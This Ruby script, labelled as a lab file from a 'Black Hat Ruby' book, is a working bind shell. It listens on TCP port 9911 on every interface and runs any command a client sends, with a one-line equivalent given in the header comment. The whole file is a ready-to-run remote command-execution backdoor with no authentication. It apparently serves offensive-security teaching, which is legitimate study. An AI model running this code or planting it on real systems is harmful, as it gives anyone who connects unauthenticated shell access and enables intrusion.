#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Bind Shell
#   One-Liner:
#     $ ruby -rsocket -e's=TCPServer.new("0.0.0.0", 9911);c=s.accept;loop {cmd=c.gets.chomp;cmd.empty?? next : cmd; IO.popen(cmd,"r") {|io| c.print io.read}}'
# Requirements:
#
require 'socket'
require 'open3'

# The number over loop is the port number the shell listens on.
Socket.tcp_server_loop(9911) do |sock, _client_addrinfo|
  begin
    while command = sock.gets.chomp
      Open3.popen2e(command.to_s) do |_stdin, stdout_and_stderr|
        IO.copy_stream(stdout_and_stderr, sock)
      end
    end
  rescue StandardError
    if command =~ /exit/
      break
      exit! 
    end
    sock.write "Command or file not found.\n"
    sock.write "Type exit to kill the shell forever on the server.\n"
    sock.write "Use ^] or ctl+C (telnet or nc) to exit and keep it open.\n"
    retry
  ensure
    sock.close
  end
end
